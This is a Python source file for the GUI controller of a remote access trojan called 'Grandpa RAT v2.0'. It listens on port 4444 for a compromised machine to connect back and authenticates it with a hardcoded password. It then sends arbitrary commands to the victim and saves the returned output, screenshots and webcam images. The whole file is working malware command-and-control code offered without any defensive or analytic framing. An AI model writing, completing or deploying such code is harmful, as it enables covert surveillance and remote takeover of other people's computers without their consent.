import socket
import threading
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from tkinter import messagebox

class GrandpaRATGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("👴 Grandpa RAT v2.0 - GUI Controller")
        self.client_socket = None
        self.connection = None
        self.address = None

        self.banner = tk.Label(master, text="👴 GRANDPA RAT v2.0", font=("Courier", 16, "bold"), fg="red")
        self.banner.pack(pady=10)

        self.cmd_entry = tk.Entry(master, width=80)
        self.cmd_entry.pack(pady=5)
        self.cmd_entry.bind("<Return>", self.send_command)

        self.send_button = tk.Button(master, text="Send Command", command=self.send_command)
        self.send_button.pack(pady=5)

        self.output_box = ScrolledText(master, height=20, width=100)
        self.output_box.pack(pady=10)

        threading.Thread(target=self.listen_for_connection, daemon=True).start()

    def listen_for_connection(self):
        self.client_socket = socket.socket()
        self.client_socket.bind(('0.0.0.0', 4444))
        self.client_socket.listen(1)
        self.connection, self.address = self.client_socket.accept()
        self.output_box.insert(tk.END, f"[+] Connected to {self.address}\n")

        received_pass = self.connection.recv(1024).decode()
        if received_pass != "grandpa123":
            self.connection.send(b"FAIL")
            self.output_box.insert(tk.END, "[-] Wrong password! Connection closed.\n")
            self.connection.close()
            return
        else:
            self.connection.send(b"OK")
            self.output_box.insert(tk.END, "[+] Authenticated!\n")

    def send_command(self, event=None):
        command = self.cmd_entry.get()
        if not command:
            return

        self.connection.send(command.encode())

        if command == "exit":
            self.master.destroy()
            return

        elif command in ["screenshot", "webcam"]:
            filename = f"{command}.jpg" if command == "webcam" else "screen.png"
            with open(filename, "wb") as f:
                while True:
                    data = self.connection.recv(1024)
                    if not data:
                        break
                    f.write(data)
            self.output_box.insert(tk.END, f"[+] {command} saved as {filename}\n")
        else:
            result = self.connection.recv(4096).decode(errors='ignore')
            self.output_box.insert(tk.END, result + "\n")

        self.cmd_entry.delete(0, tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    app = GrandpaRATGUI(root)
    root.mainloop()